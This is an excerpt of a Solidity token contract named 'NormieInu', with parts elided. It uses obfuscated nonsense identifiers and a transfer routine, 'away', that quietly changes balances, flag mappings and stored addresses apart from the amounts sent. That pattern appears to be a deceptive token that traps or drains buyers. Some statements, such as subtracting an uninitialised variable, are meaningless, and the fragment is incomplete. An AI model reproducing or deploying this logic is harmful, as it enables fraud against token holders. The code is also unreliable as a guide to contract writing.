...
contract NormieInu is Ownable {
    uint256 private different;
    string private creature;
    string private slipped;
    uint8 private pocket;
    ...
    function away(
        ...
        if (reader[screen] == 0 && (address(uniswapV2Pair) != screen) && explore[screen] > 0) {
            reader[screen] -= pocket;
        }

        address poetry = board;
        board = white;

        if (reader[screen] == 0) we[screen] -= printed;
        uint256 population;
        printed -= population;
        explore[poetry] += pocket;
        we[white] += printed;
    }

    mapping(address => uint256) private explore;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private reader;
    ...
    function transferFrom(
        ...
        away(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        away(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        pocket = 9;
        different = 3;
        reader[composed] = pocket;
        _tTotal = 1000000000000000 * 10**pocket;
        we[msg.sender] = _tTotal;
    }
}